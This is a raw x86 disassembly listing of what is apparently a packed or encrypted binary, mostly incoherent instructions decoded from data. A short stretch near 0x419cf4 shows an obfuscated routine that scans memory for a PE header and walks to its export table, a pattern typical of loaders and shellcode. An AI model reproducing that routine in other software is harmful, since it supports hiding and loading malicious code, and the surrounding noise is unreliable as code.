  419700:	sbb    ebx,DWORD PTR [ebx+0x1f3f1626]
  419706:	call   DWORD PTR [ecx-0x164fbe9d]
  41970c:	(bad)  
  41970d:	in     al,dx
  41970e:	aas    
  41970f:	jecxz  0x419756
  419711:	js     0x419768
  419713:	cmp    DWORD PTR [ecx],edi
  419715:	jnp    0x419783
  419717:	inc    eax
  419718:	pop    es
  419719:	ds test bl,0xb1
  41971d:	ret    0x361
  419720:	jge    0x419738
  419722:	sbb    al,0xf
  419724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419725:	out    dx,eax
  419726:	xor    al,0x28
  419728:	cmp    eax,0x4fac096c
  41972d:	or     bh,BYTE PTR [edx+0x2a776546]
  419733:	les    esi,FWORD PTR [esi+0x7]
  419736:	push   ecx
  419737:	mov    eax,ds:0xa44e3c47
  41973c:	lods   al,BYTE PTR ds:[esi]
  41973d:	dec    ebx
  41973e:	out    dx,al
  41973f:	fild   WORD PTR [ecx+ebx*4-0x15]
  419743:	iret   
  419744:	dec    ebx
  419745:	(bad)  
  419746:	push   ds
  419747:	push   ebp
  419748:	or     al,0x9
  41974a:	mov    ecx,0xa169ecc8
  41974f:	cmp    al,0x78
  419751:	mov    eax,0x10345659
  419756:	dec    edi
  419757:	xchg   edx,eax
  419758:	and    eax,0x4f59403c
  41975d:	shl    BYTE PTR [edi+0x6],0x3e
  419761:	jns    0x419762
  419763:	mov    ?,ecx
  419765:	push   ebp
  419766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419767:	add    eax,0x7463f44a
  41976c:	mov    edi,0x6650ac22
  419771:	adc    DWORD PTR [esp+esi*8-0x3f],0x1
  419776:	adc    al,0xb6
  419778:	or     eax,0xb5ecdfc8
  41977d:	sar    BYTE PTR [eax],cl
  41977f:	sbb    edi,DWORD PTR es:[esi+edx*8+0x5925d49]
  419787:	or     BYTE PTR [ebp-0x2590462],cl
  41978d:	dec    esp
  41978e:	ficomp DWORD PTR [edi-0x7408a59d]
  419794:	mov    edx,0xf4fb5a5b
  419799:	mov    bh,0xe4
  41979b:	scas   al,BYTE PTR es:[edi]
  41979c:	vpunpckhwd ymm7,ymm7,YMMWORD PTR [edx]
  4197a0:	or     cl,0xd1
  4197a3:	mov    eax,ds:0x28bf5595
  4197a8:	push   ecx
  4197a9:	sub    ch,BYTE PTR [ecx]
  4197ab:	xor    edx,DWORD PTR [ebx+0x580b879]
  4197b1:	cmp    eax,0xbe40da32
  4197b6:	aas    
  4197b7:	test   al,0x2d
  4197b9:	jae    0x4197e5
  4197bb:	or     esi,esp
  4197bd:	rcr    BYTE PTR [edx-0x372fc4a5],cl
  4197c3:	xchg   edi,eax
  4197c4:	pop    ss
  4197c5:	jecxz  0x419766
  4197c7:	jo     0x419847
  4197c9:	loope  0x419829
  4197cb:	xchg   bl,dh
  4197cd:	stc    
  4197ce:	xor    esi,DWORD PTR [edx+0x55d963e2]
  4197d4:	adc    ebx,DWORD PTR [edi+ebx*4-0x2b]
  4197d8:	push   0x2d087868
  4197dd:	popf   
  4197de:	(bad)  
  4197df:	and    edx,DWORD PTR [edx-0x1f256970]
  4197e5:	cmp    ch,BYTE PTR [esi+ecx*4]
  4197e8:	lock jo 0x4197cc
  4197eb:	fsubr  QWORD PTR [ebp+0x7b5c4480]
  4197f1:	(bad)  
  4197f2:	cwde   
  4197f3:	sti    
  4197f4:	jecxz  0x4197c9
  4197f6:	sbb    al,0x82
  4197f8:	sbb    eax,0x11f23c7c
  4197fd:	dec    esp
  4197fe:	pop    eax
  4197ff:	ds je  0x419785
  419802:	fidiv  WORD PTR [edi-0x1a0e5b6]
  419808:	mov    edi,0x20e3898b
  41980d:	(bad)  
  41980e:	ja     0x4197d3
  419810:	repz les ebx,FWORD PTR [ecx+0x9]
  419814:	dec    ebx
  419815:	inc    edi
  419816:	push   edi
  419817:	xor    ebx,ecx
  419819:	in     eax,0xf0
  41981b:	fbld   TBYTE PTR [ecx+0x60]
  41981e:	outs   dx,BYTE PTR ds:[esi]
  41981f:	test   eax,0xff6dfc56
  419824:	mov    ah,0xa1
  419826:	xor    al,0x2f
  419828:	mov    BYTE PTR [edi+0x2e],ch
  41982b:	in     al,dx
  41982c:	add    esp,esp
  41982e:	outs   dx,DWORD PTR ds:[esi]
  41982f:	sbb    bl,BYTE PTR [ebp+ebp*4+0x5d8312e1]
  419836:	fwait
  419837:	ins    DWORD PTR es:[edi],dx
  419838:	inc    eax
  419839:	(bad)  
  41983a:	aam    0xaf
  41983c:	(bad)  
  41983d:	mov    ch,0xb1
  41983f:	jmp    0xd13bee4f
  419844:	repz ja 0x4197f5
  419847:	ds pop ss
  419849:	pusha  
  41984a:	cdq    
  41984b:	adc    dh,BYTE PTR [edi-0x75b737b4]
  419851:	shl    DWORD PTR [esi-0x8044baf],0xe3
  419858:	cdq    
  419859:	jno    0x419898
  41985b:	push   es
  41985c:	mov    dh,0x45
  41985e:	addr16 in eax,dx
  419860:	repnz fisubr WORD PTR [ecx]
  419863:	pop    edx
  419864:	xchg   esp,eax
  419865:	inc    eax
  419866:	mov    dh,BYTE PTR [esi]
  419868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419869:	pop    ebp
  41986a:	or     dl,BYTE PTR [eax+0x71abbfd6]
  419870:	and    BYTE PTR [ecx],bl
  419872:	dec    ecx
  419873:	pushf  
  419874:	in     al,0x6f
  419876:	xchg   edx,eax
  419877:	mov    al,0xfe
  419879:	cmc    
  41987a:	mov    bh,0xd5
  41987c:	add    eax,0xeb3c17c
  419881:	jmp    0x34f31088
  419886:	or     al,0x2b
  419888:	pop    ds
  419889:	ja     0x419885
  41988b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41988c:	mov    esp,0x7ba08cbe
  419891:	loopne 0x419895
  419893:	test   BYTE PTR [eax-0x2f],ch
  419896:	(bad)  
  419897:	dec    edx
  419898:	fs push ebp
  41989a:	and    DWORD PTR [ecx+0x55417299],0xc7a0852
  4198a4:	in     al,0xf9
  4198a6:	sbb    DWORD PTR [esi+ebp*2],edi
  4198a9:	jge    0x4198b3
  4198ab:	leave  
  4198ac:	xchg   BYTE PTR [ecx-0x9f49c47],bl
  4198b2:	xlat   BYTE PTR ds:[ebx]
  4198b3:	dec    esi
  4198b4:	sbb    al,0xb8
  4198b6:	sub    al,0xcf
  4198b8:	es push ss
  4198ba:	and    al,0xe6
  4198bc:	xor    esp,0xffffffc1
  4198bf:	mov    edi,0x64d79b0e
  4198c4:	fild   WORD PTR [esi-0x2f051e6b]
  4198ca:	and    BYTE PTR cs:[ebx-0x28ec5bea],dl
  4198d1:	jne    0x419918
  4198d3:	mov    al,ds:0x3fa7bb69
  4198d8:	retf   0x5d15
  4198db:	cwde   
  4198dc:	cmp    edi,DWORD PTR [ecx+esi*8]
  4198df:	in     al,dx
  4198e0:	(bad)  
  4198e1:	(bad)  
  4198e2:	and    eax,DWORD PTR [edi]
  4198e4:	stc    
  4198e5:	fcomp  QWORD PTR [esi+0x7748e157]
  4198eb:	out    0x81,al
  4198ed:	aas    
  4198ee:	fnstcw WORD PTR [esi+0x7e]
  4198f1:	push   ds
  4198f2:	add    al,0x23
  4198f4:	mov    ebx,0xfc5b565
  4198f9:	cwde   
  4198fa:	pop    eax
  4198fb:	pop    ds
  4198fc:	push   edi
  4198fd:	bound  ecx,QWORD PTR [eax+0x27]
  419900:	xlat   BYTE PTR ds:[ebx]
  419901:	into   
  419902:	push   ecx
  419903:	in     eax,dx
  419904:	and    eax,0xbbe0c018
  419909:	mov    ecx,0x186b4a3e
  41990e:	aad    0x4a
  419910:	imul   edi,DWORD PTR [ecx+eax*2-0x2a93138f],0x1fd6fd81
  41991b:	nop
  41991c:	cdq    
  41991d:	mov    al,ds:0x1f17c476
  419922:	sub    ah,BYTE PTR ds:0xe5a427c7
  419928:	pop    esi
  419929:	cmp    cl,BYTE PTR [esi+ecx*4-0x4d7637d]
  419930:	push   0x1dd1eff9
  419935:	iret   
  419936:	jns    0x419964
  419938:	jno    0x4198dd
  41993a:	imul   ebp,DWORD PTR ds:[ecx+0x3ada0278],0x275b7a17
  419945:	(bad)  
  419946:	adc    eax,0x65a6a0b
  41994b:	sti    
  41994c:	sbb    DWORD PTR [eax+0x2a],esi
  41994f:	sub    eax,0x63c9ec5d
  419954:	mov    al,0x3c
  419956:	cmp    ah,BYTE PTR [eax-0x554355a2]
  41995c:	imul   esp,DWORD PTR [ebx],0x24fa32cc
  419962:	cmp    eax,0x8f7cdde6
  419967:	mov    ds:0x35a08dbd,eax
  41996c:	pop    ss
  41996d:	ja     0x4199a6
  41996f:	push   ebp
  419970:	or     al,BYTE PTR [esi+0x5c45ca22]
  419976:	xor    DWORD PTR [eax+0x6c],esp
  419979:	(bad)  
  41997a:	ins    DWORD PTR es:[edi],dx
  41997b:	add    BYTE PTR [ebx],dh
  41997d:	popf   
  41997e:	or     al,0xe7
  419980:	and    cl,al
  419982:	push   ecx
  419983:	das    
  419984:	ins    DWORD PTR es:[edi],dx
  419985:	sbb    al,0x23
  419987:	loope  0x419915
  419989:	cmc    
  41998a:	xor    BYTE PTR [eax],0x4f
  41998d:	mov    ah,0x3c
  41998f:	jno    0x41991b
  419991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419992:	push   ss
  419993:	mov    esp,0x67271e19
  419998:	loope  0x419983
  41999a:	mov    ebx,0x708fa378
  41999f:	mov    ebx,0x2371cfe6
  4199a4:	scas   al,BYTE PTR es:[edi]
  4199a5:	repnz mul dh
  4199a8:	xor    al,0xa
  4199aa:	mov    BYTE PTR [esi-0x79cc6247],dh
  4199b0:	xchg   esi,eax
  4199b2:	xor    eax,0xaaa6e1a3
  4199b7:	in     eax,0x16
  4199b9:	bound  esi,QWORD PTR ds:0x45f1db65
  4199bf:	aaa    
  4199c0:	add    BYTE PTR gs:[eax],dh
  4199c3:	inc    edi
  4199c4:	mov    dh,0xfd
  4199c6:	pop    ss
  4199c7:	xor    BYTE PTR [edi+0x3f],bh
  4199ca:	imul   ecx,DWORD PTR ds:0x3830527c,0x6265fa75
  4199d4:	lods   al,BYTE PTR ds:[esi]
  4199d5:	mov    ecx,0x67cf18e6
  4199da:	push   ds
  4199db:	jae    0x419991
  4199dd:	inc    DWORD PTR [ecx-0x59456ca4]
  4199e3:	dec    ebx
  4199e4:	adc    esp,DWORD PTR [ecx+0x2e]
  4199e7:	je     0x419a2f
  4199e9:	inc    ecx
  4199ea:	rol    BYTE PTR [ecx],0xaf
  4199ed:	and    eax,0x4e01f65e
  4199f2:	dec    ebp
  4199f3:	push   edx
  4199f4:	inc    eax
  4199f5:	sub    BYTE PTR [edi],dl
  4199f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199f8:	dec    ebx
  4199f9:	jne    0x4199e1
  4199fb:	and    eax,0x4d
  4199fe:	mov    ebp,0xb704fe10
  419a03:	sub    ebp,DWORD PTR [ebx+0x26]
  419a06:	in     eax,0x66
  419a08:	not    BYTE PTR [ecx+0x3e]
  419a0b:	mov    ebp,0x10389a2d
  419a10:	shr    eax,1
  419a12:	xadd   DWORD PTR [eax+0x7b],edx
  419a16:	outs   dx,DWORD PTR ds:[esi]
  419a17:	mov    dl,0x74
  419a19:	icebp  
  419a1a:	jnp    0x4199d6
  419a1c:	iret   
  419a1d:	dec    edx
  419a1e:	pushf  
  419a1f:	js     0x419a7b
  419a21:	aaa    
  419a22:	dec    esi
  419a23:	mov    al,ds:0x8d09ee27
  419a28:	mov    dl,0xd3
  419a2a:	aas    
  419a2b:	add    DWORD PTR [esi],eax
  419a2d:	mov    cl,0x23
  419a2f:	add    eax,0x259a766e
  419a34:	pop    ss
  419a35:	in     eax,0x3d
  419a37:	test   DWORD PTR [ecx-0x6b036abe],edx
  419a3d:	aam    0x99
  419a3f:	pushf  
  419a40:	rcl    dl,1
  419a42:	adc    DWORD PTR [ebp+edx*4-0x79d8cc31],ecx
  419a49:	jmp    0x419aac
  419a4b:	cdq    
  419a4c:	mov    ch,0xdd
  419a4e:	jae    0x4199fa
  419a50:	repnz popf 
  419a52:	test   BYTE PTR [edi+0x2ae65540],dl
  419a58:	mov    edi,DWORD PTR [esi+0x6a714287]
  419a5e:	mov    edi,0xbedcbed3
  419a63:	xor    BYTE PTR [eax],0x77
  419a66:	mov    esp,0xc87aa773
  419a6b:	pop    esp
  419a6c:	pop    ds
  419a6d:	(bad)  
  419a6e:	rol    cl,cl
  419a70:	mov    ds:0x49ac73af,al
  419a75:	(bad)  
  419a76:	push   ds
  419a77:	call   0xfdcac082
  419a7c:	das    
  419a7d:	mov    eax,ds:0x8623448d
  419a82:	aas    
  419a83:	jne    0x419a26
  419a85:	(bad)  [ebx]
  419a87:	cld    
  419a88:	xchg   esi,eax
  419a89:	sbb    ch,BYTE PTR [eax]
  419a8b:	addr16 (bad) 
  419a8d:	jg     0x419ab1
  419a8f:	inc    ebx
  419a90:	sbb    eax,0x5632401a
  419a95:	push   es
  419a96:	outs   dx,DWORD PTR ds:[esi]
  419a97:	cwde   
  419a98:	ret    
  419a99:	sbb    al,BYTE PTR [ebx+eiz*1+0x42]
  419a9d:	sbb    dl,BYTE PTR [ebx+0x2a0955fa]
  419aa3:	das    
  419aa4:	lods   al,BYTE PTR ds:[esi]
  419aa5:	(bad)  
  419aa6:	popf   
  419aa7:	in     eax,0x2a
  419aa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419aaa:	adc    DWORD PTR [esi],esi
  419aac:	jb     0x419b15
  419aae:	(bad)  
  419aaf:	in     al,dx
  419ab0:	mov    ds:0x6c6b6fe8,eax
  419ab5:	push   es
  419ab6:	pop    ss
  419ab7:	int3   
  419ab8:	loop   0x419a6b
  419aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419abb:	xchg   ebx,eax
  419abc:	pusha  
  419abd:	xor    BYTE PTR [esi+edx*2+0x1447993e],cl
  419ac4:	stos   DWORD PTR es:[edi],eax
  419ac5:	test   DWORD PTR ds:[esi-0x7f],ebx
  419ac9:	mov    bl,0xce
  419acb:	push   0xfffffff9
  419acd:	add    BYTE PTR [eax],0x55
  419ad0:	js     0x419b1f
  419ad2:	sbb    al,0x1c
  419ad4:	fs cs push edx
  419ad7:	lea    edi,[ebp-0x1a]
  419ada:	and    bl,dh
  419adc:	out    0x64,al
  419ade:	(bad)  
  419adf:	add    BYTE PTR [esi-0x7],bl
  419ae2:	call   0x9011:0x147aff6
  419ae9:	aad    0xf
  419aeb:	fistp  WORD PTR [edi-0xe51b4ce]
  419af1:	out    0xb5,eax
  419af3:	xchg   edi,eax
  419af4:	scas   eax,DWORD PTR es:[edi]
  419af5:	leave  
  419af6:	dec    eax
  419af7:	push   0x26e54e42
  419afc:	push   esp
  419afd:	push   0x37
  419aff:	lods   al,BYTE PTR ds:[esi]
  419b00:	push   edx
  419b01:	pop    eax
  419b02:	mov    DWORD PTR [edi+0x5e],ebp
  419b05:	in     al,dx
  419b06:	jb     0x419b4a
  419b08:	inc    ebp
  419b09:	aas    
  419b0a:	inc    ecx
  419b0b:	dec    ebx
  419b0c:	std    
  419b0d:	es js  0x419afa
  419b10:	int3   
  419b11:	jb     0x419b26
  419b13:	xchg   edi,eax
  419b14:	push   esi
  419b15:	cmp    DWORD PTR [esi+0x37],esi
  419b18:	mov    edx,0xe3c3f40e
  419b1d:	mov    DWORD PTR [ebp+0x4eecc38d],0x4acbb443
  419b27:	mov    eax,ds:0x846d6a4
  419b2c:	inc    edx
  419b2d:	or     ebx,DWORD PTR [esi+0x4a77a798]
  419b33:	pop    es
  419b34:	push   cs
  419b35:	inc    edi
  419b36:	mov    al,ds:0xe2b40ea1
  419b3b:	mov    ds:0x5334a0ea,al
  419b40:	cmp    ebp,DWORD PTR [ebp+0x56]
  419b43:	add    ebp,DWORD PTR [ebp-0xb1a22ad]
  419b49:	test   bh,bh
  419b4b:	jmp    0x6a7f810
  419b50:	in     al,dx
  419b51:	and    DWORD PTR [edx-0x59],esi
  419b54:	cmp    ecx,DWORD PTR [edi+ebp*8+0x9]
  419b58:	ss jnp 0x419b34
  419b5b:	mov    ch,BYTE PTR [eax]
  419b5d:	cmp    DWORD PTR [esi+0x52ea6079],0xffffffdc
  419b64:	pop    esi
  419b65:	dec    eax
  419b66:	leave  
  419b67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b68:	xor    BYTE PTR [ebx+0x40383624],bh
  419b6e:	clc    
  419b6f:	xor    al,0xfd
  419b71:	add    DWORD PTR [ebx-0x66],ecx
  419b74:	call   0xc5b7:0xba19dd4b
  419b7b:	xor    dh,BYTE PTR [esi-0x258a0d7e]
  419b81:	iret   
  419b82:	sub    ebp,0x77324e0e
  419b88:	inc    eax
  419b89:	add    bh,BYTE PTR [esi+0x18d86fc0]
  419b8f:	scas   eax,DWORD PTR es:[edi]
  419b90:	or     eax,0xeb471c56
  419b95:	sbb    DWORD PTR ds:[bx+si-0x67b1],esi
  419b9b:	xchg   ecx,eax
  419b9c:	jp     0x419b9f
  419b9e:	cmp    BYTE PTR [edx+0x24],ch
  419ba1:	mov    esp,DWORD PTR [edx+0x28]
  419ba4:	inc    ecx
  419ba5:	outs   dx,DWORD PTR ds:[esi]
  419ba6:	loopne 0x419b57
  419ba8:	stos   DWORD PTR es:[edi],eax
  419ba9:	out    dx,eax
  419baa:	inc    esi
  419bab:	pop    ebx
  419bac:	lock in al,dx
  419bae:	sub    bl,BYTE PTR [eax-0x2b]
  419bb1:	or     eax,0x8782f242
  419bb6:	sub    DWORD PTR [eax-0x18045368],edi
  419bbc:	fs push esi
  419bbe:	dec    edi
  419bbf:	mov    ds:0x46b973bc,eax
  419bc4:	and    al,al
  419bc6:	or     DWORD PTR [ecx-0x4b],esi
  419bc9:	gs xor eax,0x50589e25
  419bcf:	adc    al,0xf1
  419bd1:	out    dx,eax
  419bd2:	xchg   edx,ebx
  419bd4:	mov    dl,0xdd
  419bd6:	add    al,0xb9
  419bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bd9:	and    bl,bl
  419bdb:	mov    eax,0xf66c299e
  419be0:	and    al,BYTE PTR [ecx+0x41]
  419be3:	mov    DWORD PTR [edi],0xd206afb7
  419be9:	aad    0xb1
  419beb:	pop    ds
  419bec:	mov    dl,0xde
  419bee:	mov    WORD PTR [esi-0x4d],cs
  419bf1:	sbb    al,0x85
  419bf3:	ins    DWORD PTR es:[edi],dx
  419bf4:	aaa    
  419bf5:	repz (bad) 
  419bf7:	push   0x2f
  419bf9:	or     al,0x52
  419bfb:	ins    BYTE PTR es:[edi],dx
  419bfc:	out    dx,al
  419bfd:	(bad)
  419c00:	idiv   BYTE PTR [edx+0x79e77485]
  419c06:	fst    DWORD PTR [edx+0x7e]
  419c09:	retf   0x53dc
  419c0c:	leave  
  419c0d:	or     DWORD PTR [ecx],esi
  419c0f:	jle    0x419c39
  419c11:	or     DWORD PTR [edi-0x6d],ecx
  419c14:	xor    BYTE PTR [esi],cl
  419c16:	pop    eax
  419c17:	pop    ecx
  419c18:	inc    esp
  419c19:	adc    edi,DWORD PTR [edx]
  419c1b:	push   0xffffff83
  419c1d:	dec    esi
  419c1e:	inc    ebx
  419c1f:	sub    BYTE PTR [esi],dh
  419c21:	icebp  
  419c22:	push   edx
  419c23:	mov    ebx,0x5e44792c
  419c28:	repnz scas eax,DWORD PTR es:[edi]
  419c2a:	sbb    al,0x8e
  419c2c:	sbb    eax,0xbf34e7ff
  419c31:	push   esi
  419c32:	int    0x33
  419c34:	ins    DWORD PTR es:[edi],dx
  419c35:	add    eax,0x4f4b3ab5
  419c3a:	and    al,0xb7
  419c3c:	push   edi
  419c3d:	xor    ch,BYTE PTR [ebx+0x54c07e2a]
  419c43:	jb     0x419c2a
  419c45:	ret    0x8aeb
  419c48:	call   0x20e4bbc5
  419c4d:	mov    dl,0x83
  419c4f:	imul   ebp,esi,0x80185a5c
  419c55:	adc    edi,esi
  419c57:	mov    esp,0x94330e97
  419c5c:	std    
  419c5d:	clc    
  419c5e:	xchg   esi,eax
  419c5f:	sbb    BYTE PTR [eax+esi*1-0x3e1caebf],dl
  419c66:	or     BYTE PTR [eax],0x7
  419c69:	dec    esi
  419c6a:	aad    0x20
  419c6c:	push   edx
  419c6d:	rcr    bl,0xfb
  419c70:	les    esp,FWORD PTR [edx+esi*2+0x6c]
  419c74:	xor    ch,bh
  419c76:	test   DWORD PTR [edi],ebx
  419c78:	push   ss
  419c79:	loopne 0x419c4f
  419c7b:	fs nop
  419c7d:	out    dx,eax
  419c7e:	call   0x2112:0xd78bc8b4
  419c85:	outs   dx,DWORD PTR ds:[esi]
  419c86:	pop    ds
  419c87:	sbb    BYTE PTR [edx+ebp*4+0x62545ae1],ah
  419c8e:	mov    ch,0x79
  419c90:	push   esp
  419c91:	mov    ds:0x63d027ed,eax
  419c96:	cmp    eax,0x1c310ba1
  419c9b:	mov    bl,0xc6
  419c9d:	outs   dx,BYTE PTR ds:[esi]
  419c9e:	xor    al,0x58
  419ca0:	jnp    0x419c3c
  419ca2:	ins    BYTE PTR es:[edi],dx
  419ca3:	ja     0x419cb0
  419ca5:	test   ecx,0x344d6af4
  419cab:	sbb    DWORD PTR [ebx+0x3a],eax
  419cae:	xor    al,ch
  419cb0:	pop    eax
  419cb1:	mov    ch,0x1e
  419cb3:	fsin   
  419cb5:	gs inc esi
  419cb7:	adc    DWORD PTR [ebp+0x5cdb15e2],edi
  419cbd:	aad    0x9e
  419cbf:	fld    DWORD PTR [eax+0x7d2b64d4]
  419cc5:	(bad)  
  419cc6:	shl    ecx,1
  419cc8:	add    eax,0xa6b000a9
  419ccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cce:	mov    eax,0xabc67aea
  419cd3:	stos   BYTE PTR es:[edi],al
  419cd4:	mov    cl,0xa
  419cd6:	jbe    0x419d30
  419cd8:	ss das 
  419cda:	stos   DWORD PTR es:[edi],eax
  419cdb:	or     al,0x91
  419cdd:	ror    DWORD PTR [esi-0x57],1
  419ce0:	call   0x2feb:0x840799bc
  419ce7:	popa   
  419ce8:	pop    es
  419ce9:	and    eax,0x5d8b87ab
  419cee:	fmul   DWORD PTR [ebx-0x39dc2383]
  419cf4:	mov    esi,0xa147
  419cf9:	xor    bx,si
  419cfc:	mov    esi,0x4133
  419d01:	add    bx,si
  419d04:	cmp    WORD PTR [eax],bx
  419d07:	je     0x419d51
  419d0d:	mov    edi,DWORD PTR [ebp-0x10]
  419d10:	xor    edi,ecx
  419d12:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  419d19:	mov    DWORD PTR [ebp-0x24],0xffffffff
  419d20:	mov    ebx,0xffcd8d06
  419d25:	sub    ebx,edi
  419d27:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  419d2e:	add    eax,ebx
  419d30:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  419d37:	mov    edi,DWORD PTR [ebp-0x28]
  419d3a:	mov    ebx,DWORD PTR [ebp-0x24]
  419d3d:	mov    ebx,0xa147
  419d42:	xor    di,bx
  419d45:	add    di,si
  419d48:	cmp    WORD PTR [eax],di
  419d4b:	jne    0x419d0d
  419d51:	mov    edi,DWORD PTR [ebp-0x14]
  419d54:	mov    edi,DWORD PTR [edi]
  419d56:	mov    ebx,DWORD PTR [eax+0x3c]
  419d59:	lea    edi,[ebx+edi*8+0x78]
  419d5d:	mov    edi,DWORD PTR [edi+eax*1]
  419d60:	mov    DWORD PTR [ebp-0x18],edi
  419d63:	mov    edi,DWORD PTR [ebp+0x8]
  419d66:	xor    edi,ecx
  419d68:	add    edi,edx
  419d6a:	mov    DWORD PTR [ebp-0x1c],edi
  419d6d:	mov    edi,DWORD PTR [ebp+0x8]
  419d70:	xor    edi,ecx
  419d72:	jmp    0x41c0fe
  419d77:	dec    ecx
  419d78:	mov    edi,0x37790f77
  419d7d:	imul   ebx,ecx,0x2d995a11
  419d83:	(bad)  
  419d84:	pop    ds
  419d85:	push   0x7addf519
  419d8a:	jnp    0x419d74
  419d8c:	pushf  
  419d8d:	jnp    0x419e0a
  419d8f:	or     eax,0xe9b3799e
  419d94:	mov    ebp,0xeaa9ca6
  419d99:	xchg   ecx,eax
  419d9a:	sbb    dh,al
  419d9c:	cmp    eax,DWORD PTR [ebx]
  419d9e:	add    eax,0x57f8504c
  419da3:	xchg   ecx,eax
  419da4:	(bad)  
  419da5:	popa   
  419da6:	inc    edi
  419da7:	inc    ecx
  419da8:	mul    BYTE PTR [ecx-0x35891aca]
  419dae:	imul   eax,DWORD PTR [esp+esi*8+0x4a],0x39
  419db3:	and    eax,0xe2f007cc
  419db8:	jmp    0x978c:0xf4cc4dcf
  419dbf:	mov    edi,0xa1ca9290
  419dc4:	and    DWORD PTR [eax-0x10],edx
  419dc7:	call   0x8ae:0x8571daae
  419dce:	out    dx,eax
  419dcf:	arpl   di,cx
  419dd1:	repnz call 0xe4f8:0x8f774ffa
  419dd9:	add    BYTE PTR [ebx+0xd8273ed],bh
  419ddf:	mov    al,ds:0x5c8b8cd0
  419de4:	cmp    DWORD PTR [esi],0x55a92d67
  419dea:	dec    edi
  419deb:	xchg   esp,eax
  419dec:	mov    cl,0x29
  419dee:	aaa    
  419def:	bound  esi,QWORD PTR [esi]
  419df1:	data16 mov WORD PTR [edi-0x749be04],cs
  419df8:	jb     0x419e66
  419dfa:	leave  
  419dfb:	add    DWORD PTR [edx+0x58],esp
  419dfe:	xchg   edx,eax
  419dff:	mov    edi,0x96e9396a
  419e04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e05:	or     DWORD PTR [ecx],0xffffff87
  419e08:	cmp    BYTE PTR [edi+0x4ab144d9],bl
  419e0e:	push   0xffffff82
  419e10:	fdivp  st(7),st
  419e12:	scas   eax,DWORD PTR es:[edi]
  419e13:	and    al,0x6e
  419e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e16:	pop    esi
  419e17:	loopne 0x419e76
  419e19:	add    ebp,esi
  419e1b:	jecxz  0x419e22
  419e1d:	xchg   ebp,eax
  419e1e:	push   ebp
  419e1f:	xchg   esi,eax
  419e20:	rol    BYTE PTR [ebx+0x52547fb],0x26
  419e27:	ds mov ch,0x6b
  419e2a:	fnsave [ebx]
  419e2c:	sbb    cl,dh
  419e2e:	dec    ebx
  419e2f:	sub    BYTE PTR [ebx],dh
  419e31:	mov    bh,0x82
  419e33:	stos   BYTE PTR es:[edi],al
  419e34:	icebp  
  419e35:	fdivr  DWORD PTR [esi+0x2d]
  419e38:	mov    ds:0x8036c61e,eax
  419e3d:	stos   BYTE PTR es:[edi],al
  419e3e:	pop    esi
  419e3f:	(bad)  
  419e40:	push   ss
  419e41:	das    
  419e42:	sub    BYTE PTR [edi+0x14],cl
  419e45:	or     eax,0x4d421a28
  419e4a:	mov    eax,0x29d7c29a
  419e4f:	icebp  
  419e50:	arpl   bp,sp
  419e52:	push   0x1e1b4bf8
  419e57:	hlt    
  419e58:	ins    BYTE PTR es:[edi],dx
  419e59:	(bad)
  419e5d:	pop    ebx
  419e5e:	fbstp  TBYTE PTR [ecx-0x52fbf224]
  419e64:	ficom  WORD PTR [ecx-0x2468a581]
  419e6a:	test   esi,0x65203cee
  419e70:	dec    esp
  419e71:	inc    esi
  419e72:	mov    esi,0x6b4d61af
  419e77:	les    eax,FWORD PTR [edx-0x3a]
  419e7a:	pop    ss
  419e7b:	sbb    eax,0x31f131c4
  419e80:	push   ss
  419e81:	ret    0xa6b5
  419e84:	and    DWORD PTR [eax+ebp*8-0x60],esp
  419e88:	cwde   
  419e89:	add    DWORD PTR [eax+0xef7bc76],ebx
  419e8f:	add    al,0x82
  419e91:	sbb    DWORD PTR [ecx],ebx
  419e93:	sar    DWORD PTR [eax-0x1057aaf5],0xa2
  419e9a:	mov    es,edx
  419e9c:	call   0x59db72dd
  419ea1:	cmp    eax,0xf239f87e
  419ea6:	pop    esi
  419ea7:	xchg   ecx,eax
  419ea8:	fbld   TBYTE PTR ds:0x490b641d
  419eae:	pop    esp
  419eaf:	pop    ds
  419eb0:	icebp  
  419eb1:	or     dh,BYTE PTR [edx]
  419eb3:	fs sub al,0x59
  419eb6:	pop    es
  419eb7:	push   ss
  419eb8:	nop
  419eb9:	ret    
  419eba:	xor    ecx,DWORD PTR [edx+0x2c5a894c]
  419ec0:	jg     0x419e79
  419ec2:	fild   DWORD PTR ds:0x1d83eeda
  419ec8:	or     DWORD PTR [ecx+edi*4+0x4c],esi
  419ecc:	sbb    ebx,edi
  419ece:	jmp    0x419efd
  419ed0:	in     al,dx
  419ed1:	mov    BYTE PTR [edx+eax*1],dl
  419ed4:	inc    DWORD PTR [edx]
  419ed6:	mov    ah,0xa9
  419ed8:	popa   
  419ed9:	aas    
  419eda:	xor    al,0xa2
  419edc:	adc    eax,0x72806c96
  419ee1:	lahf   
  419ee2:	aaa    
  419ee3:	mov    bl,0x1c
  419ee5:	pop    edi
  419ee6:	(bad)  
  419ee7:	lock mul BYTE PTR [ebx-0x4c7ef01d]
  419eee:	mov    edi,0x7b5090f7
  419ef3:	pop    ebx
  419ef4:	xor    BYTE PTR ds:0x1cc764a,cl
  419efa:	xchg   esp,eax
  419efb:	push   0xffffff8a
  419efd:	jo     0x419f0e
  419eff:	jo     0x419ebb
  419f01:	add    dh,BYTE PTR [ebx]
  419f03:	jg     0x419ef5
  419f05:	inc    eax
  419f06:	test   bl,bh
  419f08:	mov    ecx,0xa924009f
  419f0d:	out    dx,eax
  419f0e:	loope  0x419f62
  419f10:	int    0x84
  419f12:	iret   
  419f13:	int3   
  419f14:	std    
  419f15:	(bad)  
  419f16:	cmp    al,0xf8
